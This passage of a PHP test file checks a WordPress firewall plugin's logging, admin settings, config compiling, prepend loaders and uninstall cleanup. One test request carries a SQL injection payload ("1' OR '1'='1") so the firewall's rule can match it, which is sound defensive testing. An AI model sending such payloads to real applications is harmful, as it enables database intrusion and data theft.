wp_mkdir_p( $pfw_logcfg['log_dir'] );
$pfw_v   = $pfw_run( array( 'uri' => '/wp-json/x/v1/search?q=1', 'get' => array( 'q' => "1' OR '1'='1" ) ) );
$pfw_ref = Perdita_Firewall::log( $pfw_logcfg, $pfw_v, $pfw_server( '/wp-json/x/v1/search?q=1' ) );
$pfw_logfile = $pfw_logcfg['log_dir'] . gmdate( 'Y-m-d' ) . '.log.php';
$ok( '' !== $pfw_ref && 0 === strpos( (string) file_get_contents( $pfw_logfile ), "<?php exit; ?>\n" ), 'firewall log: a match writes today\'s file, which starts with an exit line' );
file_put_contents( $pfw_logcfg['log_dir'] . gmdate( 'Y-m-d', time() - 20 * DAY_IN_SECONDS ) . '.log.php', "<?php exit; ?>\n{}\n" );
unlink( $pfw_logfile );
$pfw_ref = Perdita_Firewall::log( $pfw_logcfg, $pfw_v, $pfw_server( '/wp-json/x/v1/search?q=1' ) );
$ok( 1 === count( glob( $pfw_logcfg['log_dir'] . '*.log.php' ) ), 'firewall log: a new day\'s file prunes files older than 14 days' );
$pfw_recent = Perdita_Firewall_Config::recent( 10 );
$ok( isset( $pfw_recent[0]['ref'] ) && $pfw_ref === $pfw_recent[0]['ref'] && 'sqli-005' === $pfw_recent[0]['rule'], 'firewall log: recent() reads the newest entry back' );
$pfw_exw = Perdita_Firewall_Config::exclusion_for_entry( $pfw_recent[0] );
$ok( array( 'rule' => 'sqli-005', 'path' => '/wp-json/x/v1/search', 'param' => 'q' ) === $pfw_exw, 'firewall log: the Allow button writes the rule id, the request path, and the parameter' );
$pfw_exw = Perdita_Firewall_Config::exclusion_for_entry( array( 'rule' => 'sqli-005', 'uri' => '/WP-JSON//My-Plugin/./v1/?q=1', 'field' => 'query:q' ) );
$ok( '/wp-json/my-plugin/v1' === $pfw_exw['path'], 'firewall log: the Allow button writes a normalized path (lower case, no repeated slashes, dot segments, or trailing slash)' );
$ok( null === Perdita_Firewall_Config::exclusion_for_entry( array( 'rule' => 'ip-001', 'uri' => '/' ) ), 'firewall log: an IP block offers no Allow button' );

/* ---------- admin section ---------- */

$ok( array() === Perdita_Security_Firewall_Admin::sanitize( array( 'firewall' => '1' ) ), 'firewall admin: sanitize() returns nothing when the form had no firewall section' );
$pfw_clean = Perdita_Security_Firewall_Admin::sanitize(
	array(
		'perdita_fw_section' => '1',
		'firewall'           => '1',
		'firewall_mode'      => 'block',
		'firewall_load'      => 'evil',
		'fw_rules'           => array( 'sqli' => '1', 'xss' => '1', 'bogus' => '1' ),
		'fw_trust_roles'     => 'read',
		'fw_exclusions_text' => "sqli-005 | /wp-json/my-plugin/ | q\nxss | /Wp-Admin/<x>\nnot a rule!\n",
	)
);
$ok( true === $pfw_clean['firewall'] && 'block' === $pfw_clean['firewall_mode'] && 'plugin' === $pfw_clean['firewall_load'], 'firewall admin: sanitize() keeps a valid mode and resets an unknown loader to plugin' );
$ok( array( 'sqli', 'xss', 'traversal', 'rfi', 'php_upload', 'bad_bots', 'probes', 'xmlrpc' ) === array_keys( $pfw_clean['fw_rules'] ) && true === $pfw_clean['fw_rules']['sqli'] && false === $pfw_clean['fw_rules']['rfi'], 'firewall admin: sanitize() keeps the eight categories and drops unknown ones' );
$ok( 'edit_posts' === $pfw_clean['fw_trust_roles'], 'firewall admin: an unlisted trust capability falls back to edit_posts' );
$ok(
	array(
		array( 'rule' => 'sqli-005', 'path' => '/wp-json/my-plugin', 'param' => 'q' ),
		array( 'rule' => 'xss', 'path' => '/wp-admin/x', 'param' => '' ),
	) === $pfw_clean['fw_exclusions'],
	'firewall admin: sanitize() parses exclusion lines and drops a bad rule name'
);
ob_start();
Perdita_Security_Firewall_Admin::render_section( array_merge( $pfw_settings, array( 'fw_exclusions' => $pfw_clean['fw_exclusions'] ) ) );
$pfw_html = (string) ob_get_clean();
$ok( false !== strpos( $pfw_html, 'name="perdita_fw_section"' ) && false !== strpos( $pfw_html, 'name="fw_rules[php_upload]"' ) && false !== strpos( $pfw_html, 'sqli-005 | /wp-json/my-plugin | q' ), 'firewall admin: render_section() prints the fields and the exclusion lines' );
$ok( false !== strpos( $pfw_html, 'action=perdita_firewall_allow' ) && false !== strpos( $pfw_html, '_wpnonce=' ), 'firewall admin: each log row gets a nonced Allow link' );
$ok( ! preg_match( '/\x{2014}|;\s*(?:you|the|it)\b/u', wp_strip_all_tags( $pfw_html ) ), 'firewall admin: the section copy has no em dash' );

/* ---------- compile ---------- */

$pfw_module_on = function ( $value ) {
	$value                       = is_array( $value ) ? $value : array();
	$value['modules']['security'] = true;
	return $value;
};
add_filter( 'option_perdita_core', $pfw_module_on );
$pfw_saved = array_merge( is_array( $pfw_orig['perdita_security_settings'] ) ? $pfw_orig['perdita_security_settings'] : array(), $pfw_settings, array( 'firewall_load' => 'plugin' ) );
update_option( 'perdita_security_settings', $pfw_saved );
$pfw_cfg_path = Perdita_Firewall_Config::config_path();
$ok( is_file( $pfw_cfg_path ), 'firewall compile: saving the settings writes config.php' );
$pfw_loaded = is_file( $pfw_cfg_path ) ? include $pfw_cfg_path : null;
$ok( is_array( $pfw_loaded ) && ! empty( $pfw_loaded['enabled'] ) && $pfw_loaded['key'] === Perdita_Firewall_Config::key() && ! empty( $pfw_loaded['allowlist']['v4'] ), 'firewall compile: config.php returns the array with the key and the parsed allowlist' );
$ok( is_file( Perdita_Firewall_Config::dir() . '.htaccess' ) && is_file( Perdita_Firewall_Config::dir() . 'index.php' ) && is_file( Perdita_Firewall_Config::log_dir() . 'web.config' ), 'firewall compile: the folder and its log folder carry deny guards' );
$ok( ! is_file( Perdita_Firewall_Config::bootstrap_path() ), 'firewall R2-8: plugin mode writes no bootstrap into wp-content' );
$ok( 'plugin' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'], 'firewall compile: plugin mode writes no loader file' );
$ok( ! glob( Perdita_Firewall_Config::dir() . '.*.tmp' ), 'firewall compile: the atomic write leaves no temp file' );

// mu mode.
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'mu' ) ) );
$pfw_mu = Perdita_Firewall_Loader::mu_path();
$ok( is_file( $pfw_mu ) && false !== strpos( (string) file_get_contents( $pfw_mu ), Perdita_Firewall_Config::bootstrap_path() ), 'firewall mu: switching to mu writes 0-perdita-firewall.php, which includes the bootstrap' );
$ok( is_file( Perdita_Firewall_Config::bootstrap_path() ), 'firewall mu: the bootstrap sits beside the folder, not in it' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( ! is_file( $pfw_mu ), 'firewall mu: switching back removes the must-use plugin' );
$ok( ! is_file( Perdita_Firewall_Config::bootstrap_path() ), 'firewall R2-8: leaving mu mode removes the bootstrap when no .user.ini can still name it' );
file_put_contents( $pfw_mu, "<?php\n// Someone else's mu-plugin.\n" );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'mu' ) ) );
$ok( "<?php\n// Someone else's mu-plugin.\n" === file_get_contents( $pfw_mu ) && 'mu_foreign' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'], 'firewall mu: another plugin\'s file of that name stays untouched' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( is_file( $pfw_mu ), 'firewall mu: switching back never deletes another plugin\'s file' );
unlink( $pfw_mu );

// prepend through .user.ini (FPM).
$pfw_sapi = 'fpm-fcgi';
$pfw_sapi_cb = function () use ( &$pfw_sapi ) {
	return $pfw_sapi;
};
add_filter( 'perdita_firewall_sapi', $pfw_sapi_cb );
$pfw_ini      = $pfw_tmp . 'root/.user.ini';
$pfw_ini_orig = "; host settings\nmemory_limit = 256M\nupload_max_filesize = 64M\n";
file_put_contents( $pfw_ini, $pfw_ini_orig );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend' ) ) );
$pfw_state = get_option( Perdita_Firewall_Config::STATE_OPTION );
$pfw_text  = (string) file_get_contents( $pfw_ini );
$ok( 'prepend_installed' === $pfw_state['result'] && 0 === strpos( $pfw_text, $pfw_ini_orig ) && false !== strpos( $pfw_text, "auto_prepend_file = '" . Perdita_Firewall_Config::bootstrap_path() . "'" ), 'firewall prepend: FPM gets a marked auto_prepend_file block in .user.ini after the host\'s lines' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend', 'firewall_mode' => 'monitor' ) ) );
$ok( 'prepend_current' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_text === file_get_contents( $pfw_ini ), 'firewall prepend: a second save leaves the block as it is' );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'plugin' ) ) );
$ok( $pfw_ini_orig === file_get_contents( $pfw_ini ), 'firewall prepend: switching back removes exactly the marked block, byte for byte' );
$ok( Perdita_Firewall_Loader::bootstrap_still_needed(), 'firewall prepend: after a .user.ini removal the bootstrap stays until PHP rereads the file' );
$pfw_state = get_option( Perdita_Firewall_Config::STATE_OPTION );
$ok( is_file( Perdita_Firewall_Config::bootstrap_path() ) && ! empty( $pfw_state['bootstrap_until'] ) && $pfw_state['bootstrap_until'] > time(), 'firewall R2-8: after a .user.ini removal, plugin mode keeps the bootstrap and records how long' );
$ok( false !== strpos( Perdita_Firewall_Loader::status()['message'], 'cached .user.ini' ), 'firewall R2-8: the status screen says why the bootstrap is still there' );
$pfw_state['bootstrap_until'] = time() - 1;
update_option( Perdita_Firewall_Config::STATE_OPTION, $pfw_state, false );
$pfw_removed_ref = new ReflectionProperty( 'Perdita_Firewall_Loader', 'user_ini_removed' );
$pfw_removed_ref->setAccessible( true );
$pfw_removed_was = $pfw_removed_ref->getValue();
$pfw_removed_ref->setValue( null, 0 );
Perdita_Firewall_Loader::status();
$ok( ! is_file( Perdita_Firewall_Config::bootstrap_path() ) && empty( get_option( Perdita_Firewall_Config::STATE_OPTION )['bootstrap_until'] ), 'firewall R2-8: once the wait is over, the settings screen deletes the bootstrap' );
$ok( '' !== (string) ini_get( 'auto_prepend_file' ) || ! Perdita_Firewall_Loader::bootstrap_still_needed(), 'firewall R2-8: with no auto_prepend_file and no bootstrap, nothing calls the bootstrap needed (uninstall wrote one before)' );
$pfw_removed_ref->setValue( null, $pfw_removed_was );

file_put_contents( $pfw_ini, $pfw_ini_orig . "auto_prepend_file = '/var/www/html/wordfence-waf.php'\n" );
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall_load' => 'prepend' ) ) );
$pfw_state = get_option( Perdita_Firewall_Config::STATE_OPTION );
$ok( 'prepend_foreign' === $pfw_state['result'] && 'wordfence-waf.php' === $pfw_state['detail'] && $pfw_ini_orig . "auto_prepend_file = '/var/www/html/wordfence-waf.php'\n" === file_get_contents( $pfw_ini ), 'firewall prepend: Wordfence\'s auto_prepend_file stops the write and the screen names it' );
unlink( $pfw_ini );

// prepend through .htaccess (mod_php).
$pfw_sapi     = 'apache2handler';
$pfw_ht       = $pfw_tmp . 'root/.htaccess';
$pfw_ht_orig  = "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\n</IfModule>\n# END WordPress\n";
file_put_contents( $pfw_ht, $pfw_ht_orig );
Perdita_Firewall_Config::compile(); // The stored settings didn't change, so no update hook fires.
$pfw_text = (string) file_get_contents( $pfw_ht );
$ok( 'prepend_installed' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && false !== strpos( $pfw_text, '<IfModule mod_php.c>' ) && false !== strpos( $pfw_text, "php_value auto_prepend_file '" . Perdita_Firewall_Config::bootstrap_path() . "'" ) && false !== strpos( $pfw_text, '<IfModule LiteSpeed>' ), 'firewall prepend: mod_php gets a php_value block in .htaccess, wrapped per module' );
$pfw_state = Perdita_Firewall_Loader::status();
$ok( false === $pfw_state['working'] && '' !== $pfw_state['message'], 'firewall prepend: the status waits for PERDITA_FIREWALL_EARLY before it reports the loader as working' );
Perdita_Firewall_Config::on_deactivate();
$ok( $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall: Core deactivation removes the .htaccess block byte for byte' );
$ok( ! is_file( $pfw_cfg_path ), 'firewall: Core deactivation removes config.php, so no loader can run the engine' );
$pfw_sapi = 'cli-server';
Perdita_Firewall_Config::compile();
$ok( 'prepend_unsupported' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall prepend: an unsupported SAPI writes nothing and says why' );
$pfw_sapi = 'apache2handler';
Perdita_Firewall_Config::compile_quiet();
$ok( 'prepend_needs_save' === get_option( Perdita_Firewall_Config::STATE_OPTION )['result'] && $pfw_ht_orig === file_get_contents( $pfw_ht ), 'firewall prepend: activation never adds server config without an owner save' );
unlink( $pfw_ht );
remove_filter( 'perdita_firewall_sapi', $pfw_sapi_cb );

// Off.
update_option( 'perdita_security_settings', array_merge( $pfw_saved, array( 'firewall' => false ) ) );
$pfw_off_state = get_option( Perdita_Firewall_Config::STATE_OPTION, false );
$ok( ! is_file( $pfw_cfg_path ) && ( false === $pfw_off_state || ( 'off' === $pfw_off_state['mode'] && ! empty( $pfw_off_state['bootstrap_until'] ) ) ), 'firewall compile: turning the firewall off removes config.php and the loader state (a row stays only to time a kept bootstrap)' );
$pfw_key_before = get_option( Perdita_Firewall_Config::KEY_OPTION, false );
delete_option( Perdita_Firewall_Config::KEY_OPTION );
Perdita_Firewall_Config::compile();
$ok( false === get_option( Perdita_Firewall_Config::KEY_OPTION, false ), 'firewall compile: an off compile creates no key, so other saves leave no rows behind' );
if ( false !== $pfw_key_before ) {
	update_option( Perdita_Firewall_Config::KEY_OPTION, $pfw_key_before, true );
}
update_option( 'perdita_security_settings', $pfw_saved );
remove_filter( 'option_perdita_core', $pfw_module_on );
$pfw_core_off = function ( $value ) {
	$value                        = is_array( $value ) ? $value : array();
	$value['modules']['security'] = false;
	return $value;
};
add_filter( 'option_perdita_core', $pfw_core_off );
Perdita_Firewall_Config::compile();
$ok( ! is_file( $pfw_cfg_path ), 'firewall compile: the security module off removes config.php' );
remove_filter( 'option_perdita_core', $pfw_core_off );

/* ---------- bootstrap in a child PHP process ---------- */

$pfw_php = defined( 'PHP_BINARY' ) && is_executable( PHP_BINARY ) && 'cli' === PHP_SAPI ? PHP_BINARY : '';
if ( '' !== $pfw_php && function_exists( 'shell_exec' ) ) {
	add_filter( 'option_perdita_core', $pfw_module_on );
	Perdita_Firewall_Config::compile();
	remove_filter( 'option_perdita_core', $pfw_module_on );
	$pfw_wpc   = $pfw_tmp . 'wp-config.php';
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\n" );
	$pfw_boot  = str_replace( var_export( ABSPATH . 'wp-config.php', true ), var_export( $pfw_wpc, true ), Perdita_Firewall_Config::bootstrap_source() ); // phpcs:ignore WordPress.PHP.DevelopmentFunctions.error_log_var_export -- matches the literal.
	$pfw_boot  = preg_replace( '/, -?\d+ \);\s*$/', ', 1 );' . "\n", $pfw_boot );
	file_put_contents( Perdita_Firewall_Config::bootstrap_path(), $pfw_boot );
	$pfw_script = $pfw_tmp . 'page.php';
	file_put_contents( $pfw_script, "<?php echo 'page:', defined( 'PERDITA_FIREWALL_LOADED' ) ? PERDITA_FIREWALL_LOADED : 'none', ':', defined( 'PERDITA_FIREWALL_EARLY' ) ? 'early' : 'late';\n" );
	$pfw_cmd = function () use ( $pfw_php, $pfw_script ) {
		return (string) shell_exec( escapeshellarg( $pfw_php ) . ' -n -d auto_prepend_file=' . escapeshellarg( Perdita_Firewall_Config::bootstrap_path() ) . ' ' . escapeshellarg( $pfw_script ) . ' 2>&1' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.shell_exec_shell_exec -- the only way to run a prepend file in a test.
	};
	$pfw_out = trim( $pfw_cmd() );
	$ok( 'page:prepend:early' === $pfw_out, 'firewall bootstrap: as auto_prepend_file it loads the engine before anything else' . ( 'page:prepend:early' === $pfw_out ? '' : ' (got ' . substr( $pfw_out, 0, 300 ) . ')' ) );
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\ndefine( 'PERDITA_FIREWALL_DISABLE', true );\n" );
	touch( $pfw_wpc, time() + 5 );
	clearstatcache();
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: PERDITA_FIREWALL_DISABLE in wp-config.php turns the prepend loader off' );
	file_put_contents( $pfw_wpc, "<?php\ndefine( 'DB_NAME', 'x' );\n" );
	$pfw_cfg_bak = (string) file_get_contents( $pfw_cfg_path );
	unlink( $pfw_cfg_path );
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: with config.php gone the page loads and the engine stays out' );
	file_put_contents( $pfw_cfg_path, $pfw_cfg_bak );
	file_put_contents( Perdita_Firewall_Config::bootstrap_path(), str_replace( var_export( Perdita_Firewall_Config::engine_path(), true ), var_export( $pfw_tmp . 'missing-engine.php', true ), $pfw_boot ) ); // phpcs:ignore WordPress.PHP.DevelopmentFunctions.error_log_var_export -- matches the literal.
	$ok( 'page:none:early' === trim( $pfw_cmd() ), 'firewall bootstrap: with the plugin folder deleted the page loads with no fatal error' );
} else {
	echo "SKIP  firewall bootstrap child process (no CLI PHP binary)\n";
}

/* ---------- uninstall ---------- */

Perdita_Firewall_Config::uninstall();
$ok( ! is_dir( Perdita_Firewall_Config::dir() ), 'firewall uninstall: removes the firewall folder, its log, and its guards' );
$ok( false === get_option( Perdita_Firewall_Config::KEY_OPTION, false ) && false === get_option( Perdita_Firewall_Config::STATE_OPTION, false ), 'firewall uninstall: deletes the key and the loader state options' );

/* ---------- restore ---------- */

foreach ( $pfw_orig as $pfw_name => $pfw_value ) {
	if ( '__pfw_absent__' === $pfw_value ) {
		delete_option( $pfw_name );
	} else {
		update_option( $pfw_name, $pfw_value );
	}
}
// The settings restore recompiles, which may create the key and the state
// again, so those two go back once more.
foreach ( array( Perdita_Firewall_Config::KEY_OPTION, Perdita_Firewall_Config::STATE_OPTION ) as $pfw_name ) {
	if ( '__pfw_absent__' === $pfw_orig[ $pfw_name ] ) {
		delete_option( $pfw_name );
	} else {
		update_option( $pfw_name, $pfw_orig[ $pfw_name ] );
	}
}
foreach ( $pfw_filters as $pfw_hook => $pfw_cb ) {
	remove_filter( $pfw_hook, $pfw_cb );
}
if ( null === $pfw_uploads_orig ) {
	if ( is_file( $pfw_uploads_ht ) ) {
		unlink( $pfw_uploads_ht );
	}
} elseif ( ! is_file( $pfw_uploads_ht ) || file_get_contents( $pfw_uploads_ht ) !== $pfw_uploads_orig ) {
	file_put_contents( $pfw_uploads_ht, $pfw_uploads_orig );
}
if ( $pfw_cron_next && ! wp_next_scheduled( $pfw_cron_hook ) ) {
	wp_schedule_event( $pfw_cron_next, 'daily', $pfw_cron_hook );
}
$pfw_rm = function ( $dir ) use ( &$pfw_rm ) {
	foreach ( (array) glob( rtrim( $dir, '/' ) . '/{,.}[!.,!..]*', GLOB_BRACE ) as $pfw_f ) {
		is_dir( $pfw_f ) ? $pfw_rm( $pfw_f ) : unlink( $pfw_f );
	}
	@rmdir( $dir ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged -- test cleanup.
};
$pfw_rm( $pfw_tmp );
$ok( ! is_dir( $pfw_tmp ), 'firewall: the test removes its temp folder' );
foreach ( $pfw_opt_names as $pfw_name ) {
	$pfw_now = get_option( $pfw_name, '__pfw_absent__' );
	$ok( $pfw_now === $pfw_orig[ $pfw_name ], 'firewall: option ' . $pfw_name . ' is back to its stored value' );
}
$ok( is_file( WP_CONTENT_DIR . '/perdita-firewall/config.php' ) === $pfw_live_config && is_file( WP_CONTENT_DIR . '/mu-plugins/0-perdita-firewall.php' ) === $pfw_live_mu, 'firewall: the live config and mu-plugin are as they were' );
$ok( ( is_file( $pfw_uploads_ht ) ? (string) file_get_contents( $pfw_uploads_ht ) : null ) === $pfw_uploads_orig, 'firewall: the uploads .htaccess is back byte for byte' );
